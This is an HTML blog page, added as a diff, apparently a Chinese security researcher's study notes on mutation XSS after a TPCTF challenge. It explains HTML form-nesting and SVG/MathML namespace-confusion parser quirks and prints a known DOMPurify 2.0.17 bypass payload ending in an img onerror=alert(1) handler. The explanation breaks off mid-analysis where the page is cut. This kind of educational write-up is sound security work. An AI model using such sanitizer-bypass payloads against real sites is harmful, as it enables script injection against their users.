@@ -1,0 +1,382 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><meta name="author" content="Squirt1e"><meta name="renderer" content="webkit"><meta name="copyright" content="Squirt1e"><meta name="keywords" content="Squirt1e's blog"><meta name="description" content="一名网络安全从业人员的博客"><meta name="Cache-Control" content="no-cache"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><title>从TPCTF之walk off the earth看mXSS · Squirt1e's Blog</title><link rel="stylesheet" href="/css/style.css?v=2018.7.9"><link rel="stylesheet" href="/css/animation.css?v=2018.7.9"><link rel="icon" href="/img/assets/favicon.ico"><link rel="stylesheet" href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css?version=1.5.6"><!-- scripts--><script>(function( w ){
+  "use strict";
+  // rel=preload support test
+  if( !w.loadCSS ){
+    w.loadCSS = function(){};
+  }
+  // define on the loadCSS obj
+  var rp = loadCSS.relpreload = {};
+  // rel=preload feature support test
+  // runs once and returns a function for compat purposes
+  rp.support = (function(){
+    var ret;
+    try {
+      ret = w.document.createElement( "link" ).relList.supports( "preload" );
+    } catch (e) {
+      ret = false;
+    }
+    return function(){
+      return ret;
+    };
+  })();
+
+  // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+  // then change that media back to its intended value on load
+  rp.bindMediaToggle = function( link ){
+    // remember existing media attr for ultimate state, or default to 'all'
+    var finalMedia = link.media || "all";
+
+    function enableStylesheet(){
+      link.media = finalMedia;
+    }
+
+    // bind load handlers to enable media
+    if( link.addEventListener ){
+      link.addEventListener( "load", enableStylesheet );
+    } else if( link.attachEvent ){
+      link.attachEvent( "onload", enableStylesheet );
+    }
+
+    // Set rel and non-applicable media type to start an async request
+    // note: timeout allows this to happen async to let rendering continue in IE
+    setTimeout(function(){
+      link.rel = "stylesheet";
+      link.media = "only x";
+    });
+    // also enable media after 3 seconds,
+    // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+    setTimeout( enableStylesheet, 3000 );
+  };
+
+  // loop through link elements in DOM
+  rp.poly = function(){
+    // double check this to prevent external calls from running
+    if( rp.support() ){
+      return;
+    }
+    var links = w.document.getElementsByTagName( "link" );
+    for( var i = 0; i < links.length; i++ ){
+      var link = links[ i ];
+      // qualify links to those with rel=preload and as=style attrs
+      if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+        // prevent rerunning on link
+        link.setAttribute( "data-loadcss", true );
+        // bind listeners to toggle media back
+        rp.bindMediaToggle( link );
+      }
+    }
+  };
+
+  // if unsupported, run the polyfill
+  if( !rp.support() ){
+    // run once at least
+    rp.poly();
+
+    // rerun poly on an interval until onload
+    var run = w.setInterval( rp.poly, 500 );
+    if( w.addEventListener ){
+      w.addEventListener( "load", function(){
+        rp.poly();
+        w.clearInterval( run );
+      } );
+    } else if( w.attachEvent ){
+      w.attachEvent( "onload", function(){
+        rp.poly();
+        w.clearInterval( run );
+      } );
+    }
+  }
+
+
+  // commonjs
+  if( typeof exports !== "undefined" ){
+    exports.loadCSS = loadCSS;
+  }
+  else {
+    w.loadCSS = loadCSS;
+  }
+}( typeof global !== "undefined" ? global : this ) );</script><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" defer></script><script src="/js/main.js?v=2018.7.9" defer></script><!-- fancybox--><link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script><!-- busuanzi--><script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script><meta name="generator" content="Hexo 6.3.0"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head><body><section class="profile-close" id="cxo-profile"><div class="profile-avatar"><i class="fa fa-caret-left"></i><img src="/img/assets/avatar.jpg"></div><!--.profile-saying
+  i.fa.fa-comment
+  .saying--><div class="cxo-profile-inner"><div class="profile-name">Squirt1e</div><div class="profile-signature">for me</div><div class="friends"><div>FRIENDS</div><span><a href="http://114.67.236.137/pic/5634a4a770a0497be3f36bdc068c6f7.jpg" target="_black">美</a></span></div><div class="read-progress"></div></div></section><header id="cxo-intro" style="height: 70vh;background-image: url(/img/intro/index-bg.png);"><nav id="cxo-intro-nav"><section><div class="intro-nav-title"><a href="/">Squirt1e's Blog</a></div><div class="intro-nav-label-box"><a href="/">Home</a><a href="/about/">About</a><a href="/archives/">Archives</a><a href="/tags/">Tags</a></div><i class="fa fa-bars intro-nav-menu"><div class="intro-nav-drop"><a href="/">Home</a><a href="/about/">About</a><a href="/archives/">Archives</a><a href="/tags/">Tags</a></div></i><div class="clear"></div></section></nav><h1 class="post-title">从TPCTF之walk off the earth看mXSS</h1><div class="post-intros"><div class="post-intro-meta"><span class="post-intro-time"><i class="post-intro-calendar fa fa-calendar"></i><span>2023-12-04</span></span><span class="post-intro-tags"><a class="intro-tag fa fa-tag" href="javascript:void(0)" date-tags="XSS"> XSS</a><a class="intro-tag fa fa-tag" href="javascript:void(0)" date-tags="复现"> 复现</a><a class="intro-tag fa fa-tag" href="javascript:void(0)" date-tags="日常学习"> 日常学习</a></span></div><div class="post-intro-read"><span> Word count: <span class="post-count">3.3k</span> | Reading time: <span class="post-count">13</span>min</span></div></div></header><article class="cxo-up" id="cxo-content-outer"><section id="cxo-content-inner"><article class="article-entry" id="post"><blockquote>
+<p>这次XCTF身为XSS垃圾的我果不其然又坐牢了，现在国际赛真的是一半以上都是XSS，看了看师傅的博客就是给了个payload，没有分析原理。今天就来学习一下mXSS。主要还是跟着<a target="_blank" rel="noopener" href="https://research.securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass">这篇DOMPurify绕过</a>学习。</p>
+</blockquote>
+<h4 id="什么是mXSS"><a href="#什么是mXSS" class="headerlink" title="什么是mXSS"></a>什么是mXSS</h4><p><code>mXSS</code>的定义是</p>
+<blockquote>
+<p>如果用户所提供的富文本内容通过javascript代码进入innerHTML属性后，一些意外的变化会使得这个认定不再成立：浏览器的渲染引擎会将本来没有任何危害的HTML代码渲染成具有潜在危险的XSS攻击代码。</p>
+<p>随后，该段攻击代码，可能会被JS代码中的其它一些流程输出到DOM中或是其它方式被再次渲染，从而导致XSS的执行。 这种由于HTML内容进入innerHTML后发生意外变化，而最终导致XSS的攻击流程。</p>
+</blockquote>
+<p>读完文章云里雾里的，但是看中文定义就有一点点懂了，感觉就是解析差异导致的问题。而这部分知识的难点我想就在于找到什么元素会造成解析差异。</p>
+<p>此时我有一个疑问，为什么会存在解析差异问题？一般来说不就是把一段<code>html</code>标签交给浏览器解析从而生成<code>DOM</code>树最终渲染到页面上，哪来的另一个解析器？</p>
+<p>然而我却忽视了需求，只站在渲染页面的角度上确实不需要额外的解析器，只需要浏览器一个解析器解析我们的<code>html</code>即可。我想会有从两个角度出发的需求：</p>
+<ol>
+<li>安全角度：输入是攻击者可控的，要想过滤一些危险标签或属性的话我们不可能等浏览器渲染完再搞事情吧，除非直接把浏览器<code>hook</code>了。这时候就需要引入过滤库，而想要过滤危险标签就必须先自己解析一遍。</li>
+<li>调试角度：开发想要看自己开发的效果但是又不想渲染出来，每次看效果还得上浏览器看不方便，这时候可能也需要一个解析器来调试。</li>
+</ol>
+<p>从安全角度考虑的过滤组件<code>DOMPurify</code>流程如下：</p>
+<pre><code>1.用户输入一段html文本。
+2.html被解析成DOM树。
+3.DOMPurify清理DOM树（该过程是遍历 DOM 树中的所有元素和属性，并删除不在允许列表中的所有节点）。
+4.DOM树被序列化回 HTML 标记以分配给document.innerHTML。
+5.浏览器再次解析 HTML 标记。
+6.DOM渲染。
+</code></pre>
+<p>下面就来学习一下<code>bypass DOMPurify</code>必备的知识点。</p>
+<h4 id="form表单嵌套"><a href="#form表单嵌套" class="headerlink" title="form表单嵌套"></a>form表单嵌套</h4><p><code>form</code>标签比较特殊。他不能嵌套自己。</p>
+<p><a target="_blank" rel="noopener" href="https://html.spec.whatwg.org/#the-form-element">https://html.spec.whatwg.org/#the-form-element</a></p>
+<pre><code>Content model:
+Flow content, but with no form element descendants.
+大概意思就是form元素不能有form元素作为儿子节点，这是规矩。
+</code></pre>
+<p>不信你就试试。反正我不信我试了。</p>
+<pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
+    nonono form
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span>form1</span><span class="token punctuation">></span></span>
+        INSIDE_FORM1
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span>form2</span><span class="token punctuation">></span></span>
+        INSIDE_FORM2
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><code>That&#39;s cool,man.</code></p>
+<p><code>form2</code>真的被浏览器君吃掉了。</p>
+<img src="./pic\1701673837259.png" alt="1701673837259" style="zoom: 67%;" />
+
+<p><code>form</code>无法嵌套创建的原因：<strong>当识别到 <code>form</code>标记时，解析器需要记录一下当前是使用表单元素指针打开的。只有指针为空的时候才可以继续创建表单元素，显然上述这种情况指针还是存在的。</strong></p>
+<p>然后作者又提到了一个变异的<code>trick</code>可以搞一个嵌套，以下面为例：</p>
+<pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
+    nonono form
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>outer<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>inner<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>这个就可以。</p>
+<img src=".\pic\1701674343414.png" alt="1701674343414" style="zoom:67%;" />
+
+<p>让我们跟着作者分析一下原因：</p>
+<pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>outer<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>inner<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span><span class="token punctuation">></span></span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>这样可以嵌套的原因是：<strong>一开始，表单元素指针被设置成 id&#x3D;”outer”的指针。 然后识别一个div，接着碰到&#x2F;form结束标记将表单元素指针设置为 null。 因为表单指针现在是空的，所以可以创建下一个 id&#x3D;”inner” 的表单。注意，虽然第一个&#x2F;form结束了但实际上div在第一个form标签里，而第二个form在div标签里，也就是说在第一个form元素里。因此这样一个畸形结构是能达到嵌套的效果的。</strong></p>
+<p>而此时生成的<code>DOM</code>树序列化后则变成：</p>
+<pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>outer<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>inner<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>如果此时在用浏览器解析，因为第一个<code>outer</code>指针直到碰到了<code>inner</code>还是不为空，所以它就变成了：</p>
+<pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>outer<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>这就造成了解析差异。</p>
+<h4 id="命名空间混淆"><a href="#命名空间混淆" class="headerlink" title="命名空间混淆"></a>命名空间混淆</h4><p><code>HTML</code>解析器可以创建包含三个命名空间元素的<code>DOM</code>树：</p>
+<ul>
+<li><code>HTML</code>命名空间 ( <code>http://www.w3.org/1999/xhtml</code>)</li>
+<li><code>SVG</code>命名空间 ( <code>http://www.w3.org/2000/svg</code>)</li>
+<li><code>MathML</code>命名空间 ( <code>http://www.w3.org/1998/Math/MathML</code>)</li>
+</ul>
+<p>所有元素都位于<code>HTML</code>命名空间中；然而，如果解析器遇到<code>&lt;svg&gt;</code>or<code>&lt;math&gt;</code>元素，那么就会切换到<code>SVG</code>和<code>MathML</code>命名空间。这两个命名空间都会产生外来内容。</p>
+<p>重点来了。</p>
+<p><strong>在外来内容中，标记的解析方式与普通 HTML 中的解析方式不同，这也就导致了命名混淆问题。</strong>在<code>&lt;style&gt;</code>元素的解析上可以清楚地显示出来。在<code>HTML</code>命名空间中，<code>&lt;style&gt;</code>只能包含文本、没有子元素（后代节点），并且 HTML 实体不会被解码。然而在所谓的外部内容中情况就变了：外部内容中<code>&lt;style&gt;</code>可以具有子元素，并且实体编码会被解码。</p>
+<p>从一个例子看命名混淆：</p>
+<pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
+    命名混淆之子元素
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style language-css">&lt;a>ABC</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>svg</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span><span class="token punctuation">></span></span>ABC
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>看看被渲染成了什么样。</p>
+<img src=".\pic\1701677604463.png" alt="1701677604463" style="zoom:67%;" />
+
+<p>第一个<code>style</code>里的<code>a</code>标签果然被当成了文本，但由于第二个<code>style</code>在<code>svg</code>中，切换了命名空间。因此这时候<code>a</code>标签会被渲染出来。</p>
+<p><code>That&#39;s pretty cool,man.</code></p>
+<p>到这里作者泼了冷水：</p>
+<blockquote>
+<p>如果我们在 <svg> 或 <math> 内部，那么理论上来说所有元素也都在非 HTML 命名空间中。然而事实并不是如此，HTML 规范中有一些元素称为MathML 文本集成点和 HTML 集成点。 这些元素的子元素具有 HTML 命名空间。</p>
+</blockquote>
+<p>再来看一个例子：</p>
+<pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
+    Integration Point
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>math</span><span class="token punctuation">></span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style language-css">&lt;a>ABC</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mtext</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style language-css">&lt;a>ABC</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><code>math</code>标签的儿子<code>style</code>元素位于<code>MathML</code>命名空间中，而 <code>mtext</code> 中的<code>style</code>元素位于 <code>HTML</code>命名空间中。 这是因为<code>mtext</code>是 <code>MathML</code> 文本集成点，并使解析器切换命名空间。</p>
+<img src=".\pic\1701678240650.png" alt="1701678240650" style="zoom:67%;" />
+
+<p><a target="_blank" rel="noopener" href="https://dev.w3.org/html5/spec-LC/tree-construction.html">集成点参考这个</a>：</p>
+<p><strong>MathML:</strong></p>
+<ol>
+<li>mi</li>
+<li>mo</li>
+<li>mn</li>
+<li>ms</li>
+<li>mtext</li>
+</ol>
+<p><strong>HTML:</strong></p>
+<ol>
+<li>annotation-xml:如果其包含<code>encoding</code>属性，并且属性值等于<code>text/html</code>或者<code>application/xhtml+xml</code></li>
+<li>svg foreignObject</li>
+<li>svg desc</li>
+<li>svg title</li>
+</ol>
+<p>然而，并不是集成点所有的子节点都具有<code>HTML</code>命名空间。有两个例外：<code>mglyph</code> 和 <code>malignmark</code>。 仅当它们是 <code>MathML</code> 文本集成点的直接子级时，才会发生这种情况。</p>
+<p>举个例子。</p>
+<pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
+    Integration Point2
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>math</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mtext</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mglyph</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style language-css">&lt;a>ABC</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mglyph</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mglyph</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style language-css">&lt;a>ABC</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>因为<code>mglyph</code>是<code>mtext</code>的直接子元素，因此他的命名空间是<code>MathML</code>,所有他下面的<code>a</code>标签渲染出来了。而第二个<code>mglyph</code>是二级子节点，因此渲染不出来<code>a</code>标签，因为命名空间是<code>HTML</code>。</p>
+<img src=".\pic\1701679627566.png" alt="1701679627566" style="zoom:67%;" />
+
+<p>作者到这里整理一下判断不同命名空间的法则，我只能说这就是黑客吧（膜）：</p>
+<ul>
+<li>当前元素在其父元素的命名空间中，除非满足以下几点条件。</li>
+<li>如果当前元素是&lt; svg&gt;或&lt; math&gt;，而父元素在HTML命名空间，那么当前元素分别在SVG或MathML命名空间。</li>
+<li>如果当前元素的父元素是HTML集成点，则当前元素在HTML命名空间，除非是&lt; svg&gt;或&lt; math&gt;。</li>
+<li>如果当前元素的父元素是MathML集成点，那么当前元素在HTML命名空间，除非它是&lt; svg&gt;、&lt; math&gt;、&lt; mglyph&gt;或&lt; malignmark&gt;。</li>
+<li>如果当前元素是&lt; b&gt;、&lt; big&gt;、&lt; blockquote&gt;、&lt; body&gt;、&lt; br&gt;、&lt; center&gt;、&lt; code&gt;、&lt; dd&gt;、&lt; div&gt;、&lt; dl&gt;、&lt; dt&gt;、&lt; em&gt;、&lt; embed&gt;、&lt; h1&gt;之一。&lt; h2&gt;, &lt; h3&gt;, &lt; h4&gt;, &lt; h5&gt;, &lt; h6&gt;, &lt; head&gt;, &lt; hr&gt;, &lt; i&gt;, &lt; img&gt;, &lt; li&gt;, &lt; listing&gt;, &lt; menu&gt;, &lt; meta&gt;, &lt; nobr&gt;, &lt; ol&gt;, &lt; p&gt;, &lt; pre&gt;, &lt; ruby&gt;, &lt; s&gt;, &lt; small&gt;。&lt; span&gt;、&lt; strong&gt;、&lt; strike&gt;、&lt; sub&gt;、&lt; sup&gt;、&lt; table&gt;、&lt; tt&gt;、&lt; u&gt;、&lt; ul&gt;、&lt; var&gt;或&lt; font&gt;，并定义了颜色、面或大小属性，那么，堆栈上的所有元素都会被关闭，直到看到MathML文本整合点、HTML整合点或HTML命名空间中的元素。然后，当前元素也在HTML命名空间。</li>
+</ul>
+<h4 id="DOMPurify绕过"><a href="#DOMPurify绕过" class="headerlink" title="DOMPurify绕过"></a>DOMPurify绕过</h4><p>接着让我们看作者给的究极<code>payload</code>：</p>
+<pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>math</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mtext</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mglyph</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>math</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span> <span class="token attr-name">onerror</span><span class="token attr-value"><span class="token punctuation">=</span>alert(1)</span><span class="token punctuation">></span></span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>这个<code>payload</code>融合了<code>form</code>嵌套导致的解析问题以及命名空间混淆导致<code>svg</code>下面的<code>style</code>的子元素是文本。</p>
+<p>第一次这个文本是会被解析成这样的：</p>
+<img src=".\pic\6415e83558da0d64bdd9cf4211b0ed3.png" alt="6415e83558da0d64bdd9cf4211b0ed3" style="zoom:67%;" />
+
+<p>接下来着重讲一下为什么会变成这样子。</p>
+<p>到第三层的<code>mtext</code>都没什么好说的，后面碰到了<code>/form</code>结尾导致指针清空，之后碰到<code>form</code>这也就导致可以<code>form</code>嵌套了。然后后面又放了个<code>mglyph</code>，这是最他妈牛逼的点。因为<code>mtext</code>是集成点，而下面的儿子是<code>form</code>，所以之后的都是<code>html</code>命名空间，包括<code>mglyph</code>，那么后面的<code>style</code>自然也不用说了他就是个<code>text</code>！！！！</p>
+<p>既然是字符串的话是不会被<code>DOMPurify</code>解析的，上面这串东西无损的通过了<code>DOMPurify</code>过滤器随后序列化返回给<code>innerHTML</code>。</p>
+<pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>math</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mtext</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mglyph</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style language-css">&lt;/math>&lt;img src onerror=<span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mglyph</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mtext</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>math</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>而被浏览器二次解析的时候猜猜会发生啥？</p>
+<p>首先第二个<code>form</code>会被吃掉，因为标签没闭合。现在变成了这样：</p>
